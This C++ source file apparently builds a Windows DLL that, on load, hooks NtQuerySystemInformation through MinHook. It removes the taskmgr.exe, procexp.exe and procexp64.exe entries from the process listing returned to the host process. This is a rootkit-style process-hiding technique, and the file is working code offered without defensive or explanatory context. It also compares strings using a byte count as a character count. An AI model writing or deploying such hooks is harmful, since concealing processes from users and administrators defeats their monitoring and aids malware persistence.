#include "main.h"

const wchar_t* targetNames[] = {L"taskmgr.exe", L"procexp.exe", L"procexp64.exe"};
// int targetsPIDs[] = {0, 0, 0};

NTSTATUS WINAPI HookedNtQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID                    SystemInformation,
    ULONG                    SystemInformationLength,
    PULONG                   ReturnLength
)
{
    NTSTATUS status = OriginalNtQuerySystemInformation(SystemInformationClass,
        SystemInformation,
        SystemInformationLength,
        ReturnLength);

    if (SystemProcessInformation == SystemInformationClass && STATUS_SUCCESS == status)
    {
        PMY_SYSTEM_PROCESS_INFORMATION pCurrent = NULL;
        PMY_SYSTEM_PROCESS_INFORMATION pNext = (PMY_SYSTEM_PROCESS_INFORMATION)SystemInformation;

        do
        {
            pCurrent = pNext;
            pNext = (PMY_SYSTEM_PROCESS_INFORMATION)((PUCHAR)pCurrent + pCurrent->NextEntryOffset);

            for (int i = 0; i < 3; i++)
            {
                if (!wcsncmp(pNext->ImageName.Buffer, targetNames[i], pNext->ImageName.Length))
                {
                    if (0 == pNext->NextEntryOffset)
                    {
                        pCurrent->NextEntryOffset = 0;
                    }
                    else
                    {
                        pCurrent->NextEntryOffset += pNext->NextEntryOffset;
                    }

                    pNext = pCurrent;
                    break;
                }
            } 
        } while (pCurrent->NextEntryOffset != 0);
    }

    return status;
}


void InstallHook()
{
    if (MH_Initialize() != MH_OK) { return; }

    if (MH_CreateHookApi(L"ntdll", "NtQuerySystemInformation", reinterpret_cast<LPVOID*>(&HookedNtQuerySystemInformation), reinterpret_cast<LPVOID*>(&OriginalNtQuerySystemInformation)) != MH_OK) { return; }

    if (MH_EnableHook(&OriginalNtQuerySystemInformation) != MH_OK) { return; }
}


BOOL APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        InstallHook();
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}


